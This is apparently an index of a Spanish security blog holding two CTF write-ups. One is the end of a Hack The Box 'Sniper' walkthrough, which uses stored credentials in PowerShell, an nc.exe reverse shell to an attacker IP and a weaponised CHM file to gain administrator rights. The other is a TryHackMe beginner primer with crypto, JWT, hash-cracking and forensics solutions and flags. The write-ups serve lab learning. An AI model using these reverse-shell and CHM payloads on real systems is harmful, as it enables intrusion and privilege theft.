utilizamos las credenciales para obtener una sesion nueva utilizando powershell.\n1 2 3 4  $username =\u0026#34;Sniper\\Chris\u0026#34;; $password = convertto-securestring -AsPlainText -Force -String \u0026#34;36mEAhz/B8xQ~2VM\u0026#34;; $cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password; New-PSSession -Credential $cred | Enter-PSSession   Al ejecutar estos comandos nos muestra una shell en localhost con el usuario Chris, pero, no podemos saltar hacia otras carpetas.\nPara obtener una shell con el usuario Chris utilizamos el mismo comando que utilizamos para obtener una shell con IUSR.\n1  \\\\10.10.15.244\\test\\nc.exe -e C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 10.10.15.244 448   Obtenemos una shell y nuestra flag user.txt.\nPrivilege Escalation Malicious CHM file Enumeramos los directorios de Chris, vemos un archivo chm el cual se encuentra en C:\\Users\\Chris\\Downloads llamado instructions.chm.\nAl abrirlo en Windows nos muestra un mensaje.\nPff... This dumb CEO always makes me do all the shitty work. SMH! I'm never completing this thing. Gonna leave this place next week. Hope someone snipes him. De igual forma encontramos una nota en C:\\Docs y un PDF.\nphp for dummies-trial.pdf:\n1 2 3 4 5 6  note.txt: Hi Chris, Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you\u0026#39;ve prepared the documentation for our new app. Drop it here when you\u0026#39;re done with it. Regards, Sniper CEO.   Vemos claramente en la nota que, Chris debe de reparar los bugs que existen en la pagina, luego de eso realizar la documentacion (instructions.chm al parecer) y dejarlos en la misma carpeta que la nota.\nCopiamos el archivo instructions.chm en C:\\Docs y despues de un tiempo el archivo desaparece, por lo que asumimos que es eliminado o revisado por el CEO (\u0026ldquo;Administrador\u0026rdquo;).\nCreamos un archivo CHM el cual contenga un comando para obtener una shell inversa, utilizamos \u0026ldquo;Microsoft HTML Help Workshop and Documentation\u0026rdquo; para generarlo.\nAgregamos al archivo principal nuestro siguiente payload entre la etiqueta BODY:\n1 2 3 4 5 6 7 8 9  \u0026lt;OBJECT id=x classid=\u0026#34;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\u0026#34; width=1 height=1\u0026gt; \u0026lt;PARAM name=\u0026#34;Command\u0026#34; value=\u0026#34;ShortCut\u0026#34;\u0026gt; \u0026lt;PARAM name=\u0026#34;Button\u0026#34; value=\u0026#34;Bitmap::shortcut\u0026#34;\u0026gt; \u0026lt;PARAM name=\u0026#34;Item1\u0026#34; value=\u0026#39;,cmd.exe,/c C:\\Users\\Chris\\Documents\\nc.exe 10.10.15.244 449 -e C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#39;\u0026gt; \u0026lt;PARAM name=\u0026#34;Item2\u0026#34; value=\u0026#34;273,1,1\u0026#34;\u0026gt; \u0026lt;/OBJECT\u0026gt; \u0026lt;SCRIPT\u0026gt; x.Click(); \u0026lt;/SCRIPT\u0026gt;   Trasladamos nuestro archivo a la carpeta C:\\Docs, netcat (nc.exe) y esperamos a que nuestro payload sea ejecutado:\nObtenemos nuestra shell con permisos de administrador y nuestra flag root.txt.\n","description":"Descubrimos una vulnerabilidad LFI/RFI en el blog donde ejecutamos una shell inversa utilizando una WebShell. Cambiamos al siguiente usuario utilizando PowerShell y credenciales almacenadas. Creando un archivo CHM y tras ser ejecutado escalamos privilegios.","id":95,"section":"posts","tags":["lfi","impacket","smbmap","chm"],"title":"Hack The Box - Sniper","uri":"https://sckull.github.io/posts/sniper/"},{"content":"  Stealthcopter CTF Primer es una serie de retos de TryHackMe donde utilizamos distintas herramientas para resolver los retos.\nRoom    Titulo Stealthcopter ctf primer1      Descripción CTF primer containing 40 challenges (web, network, crypto and forensics) for beginnners   Puntos *   Dificultad Facil   Maker stealthcopter     WEB w.01 Revisa el codigo fuente de la pagina.\nw.02 Repara el nombre del script en la cabecera del archivo HTML y revisa la consola (developmer tools).\nw.03 Imagen base64 codificada.\nw.04 Elimina los // en el codigo fuente.\nw.05 Key bruteforce o adivina ;).\n1 2 3 4 5  sckull@uplifted:~/tmp/web$ php w.05.php \u0026#39;key=7\u0026#39; Key entered: 7 CipherText: T3FiSXVlOFYvVTJCRHRnRFdTRUZOeHplNVZpK0pQZUVUbWNmTHNCZUt5RT0= PlainText: FLAG{n0t_s0_t0ugh} sckull@uplifted:~/tmp/web$   w.06 Reto\n1  var _0x550c=[\u0026#39;HsOde8OyacKIw518XMKNPsO8SMO7w4JxwoPCugDCiwh4w43Cqw==\u0026#39;,\u0026#39;CcK3wq4=\u0026#39;];(function(_0x1421f9,_0xa7900b){var _0x371c54=function(_0x5f2f93){while(--_0x5f2f93){_0x1421f9[\u0026#39;push\u0026#39;](_0x1421f9[\u0026#39;shift\u0026#39;]());}};_0x371c54(++_0xa7900b);}(_0x550c,0x1e6));var _0x56ae=function(_0xec1512,_0x3f22ed){_0xec1512=_0xec1512-0x0;var _0x353971=_0x550c[_0xec1512];if(_0x56ae[\u0026#39;wlUhtf\u0026#39;]===undefined){(function(){var _0x353626=function(){var _0x1efe97;try{_0x1efe97=Function(\u0026#39;return\\x20(function()\\x20\u0026#39;+\u0026#39;{}.constructor(\\x22return\\x20this\\x22)(\\x20)\u0026#39;+\u0026#39;);\u0026#39;)();}catch(_0x299503){_0x1efe97=window;}return _0x1efe97;};var _0x53087e=_0x353626();var _0x4b80a9=\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\u0026#39;;_0x53087e[\u0026#39;atob\u0026#39;]||(_0x53087e[\u0026#39;atob\u0026#39;]=function(_0x8b960b){var _0x584879=String(_0x8b960b)[\u0026#39;replace\u0026#39;](/=+$/,\u0026#39;\u0026#39;);for(var _0x38ec89=0x0,_0xcfc329,_0xd90795,_0x409b70=0x0,_0x429a24=\u0026#39;\u0026#39;;_0xd90795=_0x584879[\u0026#39;charAt\u0026#39;](_0x409b70++);~_0xd90795\u0026amp;\u0026amp;(_0xcfc329=_0x38ec89%0x4?_0xcfc329*0x40+_0xd90795:_0xd90795,_0x38ec89++%0x4)?_0x429a24+=String[\u0026#39;fromCharCode\u0026#39;](0xff\u0026amp;_0xcfc329\u0026gt;\u0026gt;(-0x2*_0x38ec89\u0026amp;0x6)):0x0){_0xd90795=_0x4b80a9[\u0026#39;indexOf\u0026#39;](_0xd90795);}return _0x429a24;});}());var _0x4f002d=function(_0x5c44fa,_0x3f22ed){var _0x2dee1d=[],_0x17ee0=0x0,_0x4a4ac3,_0x41b3d2=\u0026#39;\u0026#39;,_0x329c74=\u0026#39;\u0026#39;;_0x5c44fa=atob(_0x5c44fa);for(var _0x2ee72b=0x0,_0x1f3f1d=_0x5c44fa[\u0026#39;length\u0026#39;];_0x2ee72b\u0026lt;_0x1f3f1d;_0x2ee72b++){_0x329c74+=\u0026#39;%\u0026#39;+(\u0026#39;00\u0026#39;+_0x5c44fa[\u0026#39;charCodeAt\u0026#39;](_0x2ee72b)[\u0026#39;toString\u0026#39;](0x10))[\u0026#39;slice\u0026#39;](-0x2);}_0x5c44fa=decodeURIComponent(_0x329c74);for(var _0xbc2d51=0x0;_0xbc2d51\u0026lt;0x100;_0xbc2d51++){_0x2dee1d[_0xbc2d51]=_0xbc2d51;}for(_0xbc2d51=0x0;_0xbc2d51\u0026lt;0x100;_0xbc2d51++){_0x17ee0=(_0x17ee0+_0x2dee1d[_0xbc2d51]+_0x3f22ed[\u0026#39;charCodeAt\u0026#39;](_0xbc2d51%_0x3f22ed[\u0026#39;length\u0026#39;]))%0x100;_0x4a4ac3=_0x2dee1d[_0xbc2d51];_0x2dee1d[_0xbc2d51]=_0x2dee1d[_0x17ee0];_0x2dee1d[_0x17ee0]=_0x4a4ac3;}_0xbc2d51=0x0;_0x17ee0=0x0;for(var _0x4301cb=0x0;_0x4301cb\u0026lt;_0x5c44fa[\u0026#39;length\u0026#39;];_0x4301cb++){_0xbc2d51=(_0xbc2d51+0x1)%0x100;_0x17ee0=(_0x17ee0+_0x2dee1d[_0xbc2d51])%0x100;_0x4a4ac3=_0x2dee1d[_0xbc2d51];_0x2dee1d[_0xbc2d51]=_0x2dee1d[_0x17ee0];_0x2dee1d[_0x17ee0]=_0x4a4ac3;_0x41b3d2+=String[\u0026#39;fromCharCode\u0026#39;](_0x5c44fa[\u0026#39;charCodeAt\u0026#39;](_0x4301cb)^_0x2dee1d[(_0x2dee1d[_0xbc2d51]+_0x2dee1d[_0x17ee0])%0x100]);}return _0x41b3d2;};_0x56ae[\u0026#39;ZUnPBK\u0026#39;]=_0x4f002d;_0x56ae[\u0026#39;ffVsLy\u0026#39;]={};_0x56ae[\u0026#39;wlUhtf\u0026#39;]=!![];}var _0x5e7cc1=_0x56ae[\u0026#39;ffVsLy\u0026#39;][_0xec1512];if(_0x5e7cc1===undefined){if(_0x56ae[\u0026#39;RhVTbi\u0026#39;]===undefined){_0x56ae[\u0026#39;RhVTbi\u0026#39;]=!![];}_0x353971=_0x56ae[\u0026#39;ZUnPBK\u0026#39;](_0x353971,_0x3f22ed);_0x56ae[\u0026#39;ffVsLy\u0026#39;][_0xec1512]=_0x353971;}else{_0x353971=_0x5e7cc1;}return _0x353971;};function callme(){var _0x4b81bb=_0x56ae(\u0026#39;0x0\u0026#39;,\u0026#39;E^eq\u0026#39;);console[_0x56ae(\u0026#39;0x1\u0026#39;,\u0026#39;X!jV\u0026#39;)](_0x4b81bb);}   Ejecuta la funcion callme().\nw.07 Key bruteforce o adivina ;).\nsckull@uplifted:~/tmp/web$ php w.07.php 'key=1337' Key entered: 1337 CipherText: QXhUQzVLYjJkU2dZOEhkbHQ3dXZ4NndoWlh1Y0hyeUpsVEhVYTFxT3lWbz0= PlainText: sckull@uplifted:~/tmp/web$ php w.07.php 'key=1338' Key entered: 1338 CipherText: QXhUQzVLYjJkU2dZOEhkbHQ3dXZ4NndoWlh1Y0hyeUpsVEhVYTFxT3lWbz0= PlainText: FLAG{4_l1ttl3_b4t_h4rd3r} sckull@uplifted:~/tmp/web$ w.08 Reto\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIzNCwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiRkxBR3tqd3RfdDBrM25zX2FyM19jMDBsX2IzNG56fSJ9.gNVX4fCIMvjLYZ0jUY0untMYbPmRNNFzZwXyU01bv-M Json Web Token\nw.09 Reto\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTMzNywidXNlcm5hbWUiOiJhZG1pbiIsImhpbnQiOiJ0aGUgZmxhZyBpcyBGTEFHe3h4eHh4eHhfZDFjdDEwbjRyeV80dHQ0Y2t9IHdoZXJlIHh4eHh4eHggaXMgdGhlIHBhc3N3b3JkIHVzZWQgdG8gc2lnbiB0aGlzIHRva2VuIn0#756c17ca05dbc57b9ded6541055370059c145e3b31521c0c98df2b1674725601 Utilizamos hashcat\nsckull@uplifted:~/tmp/web$ /home/sckull/tools/hashcat/hashcat64.bin -m 16500 09web_jwt.txt /home/sckull/tools/rockyou.txt -o 09web_output.txt hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026quot;CL_OUT_OF_RESOURCES\u0026quot; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Not-Iterated * Single-Hash * Single-Salt Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: /home/sckull/tools/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 Session..........: hashcat Status...........: Cracked Hash.Type........: JWT (JSON Web Token) Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTMzNy...nRyVgE Time.Started.....: Mon Mar 16 02:21:40 2020 (0 secs) Time.Estimated...: Mon Mar 16 02:21:40 2020 (0 secs) Guess.Base.......: File (/home/sckull/tools/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 6400.2 kH/s (8.23ms) @ Accel:512 Loops:1 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 98304/14344385 (0.69%) Rejected.........: 0/98304 (0.00%) Restore.Point....: 0/14344385 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: 123456 -\u0026gt; Donovan Hardware.Mon.#1..: Temp: 60c Util: 47% Core:1189MHz Mem:2505MHz Bus:4 Started: Mon Mar 16 02:21:29 2020 Stopped: Mon Mar 16 02:21:42 2020 sckull@uplifted:~/tmp/web$ cat 09web_output.txt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTMzNywidXNlcm5hbWUiOiJhZG1pbiIsImhpbnQiOiJ0aGUgZmxhZyBpcyBGTEFHe3h4eHh4eHhfZDFjdDEwbjRyeV80dHQ0Y2t9IHdoZXJlIHh4eHh4eHggaXMgdGhlIHBhc3N3b3JkIHVzZWQgdG8gc2lnbiB0aGlzIHRva2VuIn0.dWwXygXbxXud7WVBBVNwBZwUXjsxUhwMmN8rFnRyVgE:rockyou sckull@uplifted:~/tmp/web$ w.10 La clave esta en el codigo fuente $key = hash( 'sha256', str(0x22C49FE9));\nsckull@uplifted:~/tmp/web$ python Python 2.7.17 (default, Nov 7 2019, 10:07:09) [GCC 7.4.0] on linux2 Type \u0026quot;help\u0026quot;, \u0026quot;copyright\u0026quot;, \u0026quot;credits\u0026quot; or \u0026quot;license\u0026quot; for more information. \u0026gt;\u0026gt;\u0026gt; print 0x22C49FE9 583311337 \u0026gt;\u0026gt;\u0026gt; sckull@uplifted:~/tmp/web$ php w.10.php 'key=583311337' Key entered: 583311337 CipherText: OWVzUHhVVFNsM0t6NFhDb1FiT0RJaHNrWWYrM3VRMi9FNXcyTGhxbVV0aHpKUjdOcGRVcWtZcWc3djV5OFVxQw== PlainText: FLAG{1_h0p3_y0u_d1dnt_brut3f0rc3_m3...LINE_16} sckull@uplifted:~/tmp/web$ Cryptography c.01 Reto:\nRkxBR3sxc3RfdGltZV9sdWNreX0= Base64\n1 2 3 4 5  sckull@uplifted:~/tmp/crypto$ cat c.01 RkxBR3sxc3RfdGltZV9sdWNreX0= sckull@uplifted:~/tmp/crypto$ cat c.01|base64 -d FLAG{1st_time_lucky} sckull@uplifted:~/tmp/crypto$   c.02 Reto:\nVW10NFFsSXpjM3BqYlZKbVpFZHNkRnBZVG1aWlZqbHFZVWRHZVdKWU1EMD0= Base64 X3\n1  https://gchq.github.io/CyberChef/#recipe=From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)\u0026amp;input=VlcxME5GRnNTWHBqTTNCcVlsWktiVnBGWkhOa1JuQlpWRzFhV2xacWJIRlpWV1JIWlZkS1dVMUVNRDA9   c.03 Reto:\nSYNT{fgnoorq_va_gur_onpx} ROT13\nhttps://gchq.github.io/CyberChef/#recipe=ROT13(true,true,13)\u0026amp;input=U1lOVHtmZ25vb3JxX3ZhX2d1cl9vbnB4fQ c.04 Reto:\nF5yd29CuXST7e5aMKaX4bnkV8xF8dKSMB7E14yWUU Base58\nhttps://gchq.github.io/CyberChef/#recipe=From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',false)\u0026amp;input=RjV5ZDI5Q3VYU1Q3ZTVhTUthWDRibmtWOHhGOGRLU01CN0UxNHlXVVU c.05 Reto:\n\\H\u0011WPG^DCXET\u0011EHAT\u0011^W\u0011T_RCHAEX^_\u0011XB\u0011I^CX_V;XE\u0016B\u0011EYT\u0011STBE;\u0012B^\u0011BTRDCT;;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL 1- XOR BruteForce (Key: 31)\n2- XOR\nhttps://gchq.github.io/CyberChef/#recipe=XOR_Brute_Force(1,100,0,'Standard',false,true,false,''/disabled)XOR(%7B'option':'Hex','string':'31'%7D,'Standard',false)\u0026amp;input=XEgRV1BHXkRDWEVUEUVIQVQRXlcRVF9SQ0hBRVheXxFYQhFJXkNYX1Y7WEUWQhFFWVQRU1RCRTsSQl4RQlRSRENUOzt3fXB2SkleQ25YQm5CREFUQ25CVFJEQ1RMO3d9cHZKSV5DblhCbkJEQVRDbkJUUkRDVEw7d31wdkpJXkNuWEJuQkRBVENuQlRSRENUTDt3fXB2SkleQ25YQm5CREFUQ25CVFJEQ1RMO3d9cHZKSV5DblhCbkJEQVRDbkJUUkRDVEw7d31wdkpJXkNuWEJuQkRBVENuQlRSRENUTDt3fXB2SkleQ25YQm5CREFUQ25CVFJEQ1RMO3d9cHZKSV5DblhCbkJEQVRDbkJUUkRDVEw7d31wdkpJXkNuWEJuQkRBVENuQlRSRENUTA c.06 Reto:\nMlw Obkwgxvw vbtzxk mk t filahh gy xrukrtlbgk seilsuxxav mipm uc mlbry t lijbxw gy brlxkagoxr Utxwsk vmhaxvk, utwww hr lax pwmmijl hj s dxcohkh. Am xqhehck t ysjf hj hhecseilsuxxav lytlmmlnmmgg. Ymjlm hwlvvauxh tr Zmgotr Ttmxalme Txepslh mf 1553, mai ubilwk bw wtlc lh nrvxkwltgh sgw meieiexgx, tnm ml kxwalmiv tep smmieimw lh uvwtd ml ngxae 1863, mljxx gwgmyjbxw dtmij. Mamk xtvfxw ml mai vxlgjbixahg pw vamxyki agwiuabjxktfdx (Yvwgvl xhk 'xzx brvxvmhaxvsuei ubilwk'). Fefr iigiei ztoi lkbiv mh meieiexgx wgvvqimmgg lgzxfik mael tki wllifmbeder Zazxrwkx gaiaijl. Br 1863, Xkbivkbgz Dtwaldm otl xzx ymjlm xg infdbll s zxrwktp exmlgw hj vxvmhaxvagz Zazxrwkx gaiaijl. Br lax 19xz vxrlnkc lax wuaxqw ptw eblelmkmtnmiv mh Fdtbww wx Zazxrwkx (1523–1596), efw ls svjyakxh aml tjxlifm geex. Rsmk ypsz bw txeso: YEEY{vasuheelx_xgdtbvw} Vigenere-cipher\nc.07 Reto:\n-----BEGIN RSA PRIVATE KEY----- MIIBOQIBAAJBALWyVLY0Yum5/589v9ECnrHDzDu1AyDP38Ajx6tcul9G2cFUFUMY Iqf9Wm8BFxNxErdOWmhlJaw+q8rbaAyyRvUCAwEAAQJAWEYrodoRtDwJVPRLHOCI +RSHRPrMakSUEGVRvI9wfJi654A0HYLyk8JZnf+CbeueI7KnN/2w4MPIkxK9Mjfk gQIhAP878FR1Yo1X508REZ1YNVDKc6pl33Fm32LVSbz5s/RzAiEAtj3nQwJEgVG4 Bv2CIBZ1CRIGmILeZY3Cx54hGnB55PcCIGy/CgfCN+pHALvUZu/mTFkO2TdJzmkP zq/adl94+K53AiAZ5PHXM5tIRLRBSgQTSx2WDFmjkfTHuTzT4EQT3ad0QQIgUPy3 p9QrcqBWnnHkTM+MjIjpRzQ2TMLx1e6dOxgYDl4= -----END RSA PRIVATE KEY----- openssl enc -in c.07.txt -out binarytext -d -a \u0026amp;\u0026amp; openssl rsautl -decrypt -in binarytext -out flag07.txt -inkey c.07.key \u0026amp;\u0026amp; cat flag07.txt\nc.08 Reto:\nhint: bacon loloooolooololoololoooollollololloooolooloolooolllooloooololololoooooooollooloooloooloooolooooooooloollololloooooooollooooollooloooollooolloloooloooooollooooollloloooloooooolooolll Bacon Cipher\nc.09 Reto:\nWOPM PM ZG ZDJOZEYWPR MXEMWPWXWPHG RPJOYL VOYLY YZRO DYWWYL PM LYJDZRYT VPWO ZGHWOYL. WOY ZDJOZEYW PM ZERTYUIOPQSDFGHJKLMWXCVBNA. NHXL UDZI PM UDZI{YZMN_ZM_ZER_123} 1- Monoalphabetic Substitution\n2- CyberChef - Monoalphabetic Substitution\nhttps://gchq.github.io/CyberChef/#recipe=Substitute('PLAYFM','FLAGYB')\u0026amp;input=VEhJUyBJUyBBTiBBTERIQU1FVElDIFNVTVNUSVRVVElPTiBDSURIRVIgV0hFUkUgRUFDSCBMRVRURVIgSVMgUkVETEFDRUcgV0lUSCBBTk9USEVSLiBUSEUgQUxESEFNRVQgSVMgQU1DR0VQWUhJVlpMS05PREpSU1RVQldRRlguIEZPVVIgUExBWSBJUyBQTEFZe0VBU0ZfQVNfQU1DXzEyM30 FLAG{easy_as_abc_123}\nc.10 Reto:\n333 555 2 4 7 777 33 2 66 3 777 666 444 3 2 66 3 444 666 7777 Multitap abc Cipher\nForensics f.01 1 2 3  sckull@uplifted:~/tmp/forensics$ cat f.01|grep FLAG FLAG{here_i_am} sckull@uplifted:~/tmp/forensics$   f.02.wav Morse - Decoder Audio\n1  FLAG{MORSE **** ***}   f.03.jpg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64  sckull@uplifted:~/tmp/forensics$ exiftool f.03.jpg ExifTool Version Number : 10.80 File Name : f.03.jpg Directory : . File Size : 103 kB File Modification Date/Time : 2019:10:26 13:57:46-06:00 File Access Date/Time : 2019:10:26 13:57:46-06:00 File Inode Change Date/Time : 2020:03:10 18:52:40-06:00 File Permissions : rw-rw-r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.01 Exif Byte Order : Little-endian (Intel, II) X Resolution : 300 Y Resolution : 300 Resolution Unit : inches Software : GIMP 2.10.8 Modify Date : 2019:10:20 20:43:54 GPS Latitude : 0 deg 0\u0026#39; 0.00\u0026#34; GPS Longitude : 0 deg 0\u0026#39; 0.00\u0026#34; GPS Altitude : 0 m Compression : JPEG (old-style) Photometric Interpretation : YCbCr Samples Per Pixel : 3 Thumbnail Offset : 370 Thumbnail Length : 10424 XMP Toolkit : XMP Core 4.4.0-Exiv2 Digital Source Type : http://cv.iptc.org/newscodes/digitalsourcetype/digitalCapture Document ID : gimp:docid:gimp:718367af-6e16-4bd5-859e-7d934e66fc4e Instance ID : xmp.iid:4816adee-26e4-489c-9d9f-125d04d23c3b Original Document ID : xmp.did:8ea562a1-efa5-4766-b216-6fd07e106c76 Model Release Status : None Api : 2.0 Platform : Linux Time Stamp : 1571600638600225 Version : 2.10.8 Format : image/jpeg Creator Tool : GIMP 2.10 Location Created : Location Shown : Artwork Or Object : Registry ID : History Action : saved, saved History Changed : /metadata, / History Instance ID : xmp.iid:aad9dc17-4a47-49b9-a57f-540623e0091d, xmp.iid:d8a72d8c-5fd0-43b7-a097-16b682f31893 History Software Agent : Gimp 2.10 (Linux), Gimp 2.10 (Linux) History When : +01:00, +01:00 Image Supplier : Image Creator : Copyright Owner : Licensor : Creator : type=\u0026#34;Seq\u0026#34; FLAG{**********} Image Width : 800 Image Height : 600 Encoding Process : Progressive DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:4:4 (1 1) Image Size : 800x600 Megapixels : 0.480 Thumbnail Image : (Binary data 10424 bytes, use -b option to extract) GPS Position : 0 deg 0\u0026#39; 0.00\u0026#34;, 0 deg 0\u0026#39; 0.00\u0026#34; sckull@uplifted:~/tmp/forensics$  f.04 1 2 3 4 5  sckull@uplifted:~/tmp/forensics$ file _f.04 _f.04: ASCII text sckull@uplifted:~/tmp/forensics$ cat _f.04 FLAG{*******_****_engaged} sckull@uplifted:~/tmp/forensics$   f.05.png 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  sckull@uplifted:~/tmp/forensics$ binwalk f.05.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 1406 x 800, 8-bit/color RGB, non-interlaced 99 0x63 Zlib compressed data, default compression 2093725 0x1FF29D Zip archive data, at least v2.0 to extract, compressed size: 44, uncompressed size: 400, name: flag.txt 2093913 0x1FF359 End of Zip archive sckull@uplifted:~/tmp/forensics$ binwalk -e f.05.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 1406 x 800, 8-bit/color RGB, non-interlaced 99 0x63 Zlib compressed data, default compression 2093725 0x1FF29D Zip archive data, at least v2.0 to extract, compressed size: 44, uncompressed size: 400, name: flag.txt 2093913 0x1FF359 End of Zip archive sckull@uplifted:~/tmp/forensics$ cd _f.05.png.extracted/ sckull@uplifted:~/tmp/forensics/_f.05.png.extracted$ ls 1FF29D.zip 63\t63.zlib flag.txt sckull@uplifted:~/tmp/forensics/_f.05.png.extracted$ cat flag.txt flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} sckull@uplifted:~/tmp/forensics/_f.05.png.extracted$   f.06.png 1 2 3 4 5 6 7 8 9 10 11 12 13  sckull@uplifted:~/tmp/forensics$ xxd f.06.png |head 00000000: 8950 4e58 0d0a 1a0a 0000 000d 4948 4452 .PNX........IHDR 00000010: 0000 0640 0000 0429 0806 0000 0099 68c1 ...@...)......h. 00000020: 1c00 002d c07a 5458 7452 6177 2070 726f ...-.zTXtRaw pro 00000030: 6669 6c65 2074 7970 6520 6578 6966 0000 file type exif.. 00000040: 78da ad9c 6992 2d37 8ea5 ff73 15b9 04ce x...i.-7...s.... 00000050: c372 4090 34eb 1dd4 f2eb 3b1e 21a9 a4ac .r@.4.....;.!... 00000060: 2ab3 6e6b 3d65 46e8 be3b b813 c019 40f0 *.nk=eF..;....@. 00000070: 86fb 1fff e785 7ffd eb5f 29e6 1443 6d63 ........._)..Cmc 00000080: f6d5 7be4 9fba eaca c62f 33fe fcf3 f333 ..{....../3....3 00000090: c5fa fdff f70f bff6 df47 fff6 78c8 ebfb .........G..x... sckull@uplifted:~/tmp/forensics$ sckull@uplifted:~/tmp/forensics$ xxd -p f.06.png \u0026gt; hex_png06   BAD HEADER FILE MAGIC NUMBERS\nList of File Signatures\n1 2  89 50 4E 47 0D 0A 1A 0A FLAG{n0_m0r3_c0rrupt10n}   f.07.zip 1 2 3 4 5 6 7 8 9 10  sckull@uplifted:~/tmp/forensics$ fcrackzip -D -u -p /home/sckull/tools/rockyou.txt f.07.zip PASSWORD FOUND!!!!: pw == password1 sckull@uplifted:~/tmp/forensics$ sckull@uplifted:~/tmp/forensics$ unzip f.07.zip Archive: f.07.zip [f.07.zip] flag.txt password: inflating: flag.txt sckull@uplifted:~/tmp/forensics$ cat flag.txt FLAG{zippy_zip_zip_zip} sckull@uplifted:~/tmp/forensics$   f.08 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  sckull@uplifted:~/tmp/forensics$ file f.08 f.08: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, BuildID[sha1]=ea2b43595682667af187b0ac8db31207e9bf845f, for GNU/Linux 3.2.0, not stripped sckull@uplifted:~/tmp/forensics$ chmod +x f.08 sckull@uplifted:~/tmp/forensics$ ./f.08 Hello, please enter the flag: hello Sorry the flag is incorrect sckull@uplifted:~/tmp/forensics$ gdb -q ./f.08 Reading symbols from ./f.08...(no debugging symbols found)...done. gdb-peda$ disas main [... snip ...] 0x00000000000011d4 \u0026lt;+43\u0026gt;:\tmov BYTE PTR [rbp-0x73],0x46 0x00000000000011d8 \u0026lt;+47\u0026gt;:\tmov BYTE PTR [rbp-0x72],0x4c 0x00000000000011dc \u0026lt;+51\u0026gt;:\tmov BYTE PTR [rbp-0x71],0x41 0x00000000000011e0 \u0026lt;+55\u0026gt;:\tmov BYTE PTR [rbp-0x70],0x47 0x00000000000011e4 \u0026lt;+59\u0026gt;:\tmov BYTE PTR [rbp-0x6f],0x7b 0x00000000000011e8 \u0026lt;+63\u0026gt;:\tmov BYTE PTR [rbp-0x6e],0x69 0x00000000000011ec \u0026lt;+67\u0026gt;:\tmov BYTE PTR [rbp-0x6d],0x6e 0x00000000000011f0 \u0026lt;+71\u0026gt;:\tmov BYTE PTR [rbp-0x6c],0x63 0x00000000000011f4 \u0026lt;+75\u0026gt;:\tmov BYTE PTR [rbp-0x6b],0x6f 0x00000000000011f8 \u0026lt;+79\u0026gt;:\tmov BYTE PTR [rbp-0x6a],0x72 0x00000000000011fc \u0026lt;+83\u0026gt;:\tmov BYTE PTR [rbp-0x69],0x72 0x0000000000001200 \u0026lt;+87\u0026gt;:\tmov BYTE PTR [rbp-0x68],0x65 0x0000000000001204 \u0026lt;+91\u0026gt;:\tmov BYTE PTR [rbp-0x67],0x63 0x0000000000001208 \u0026lt;+95\u0026gt;:\tmov BYTE PTR 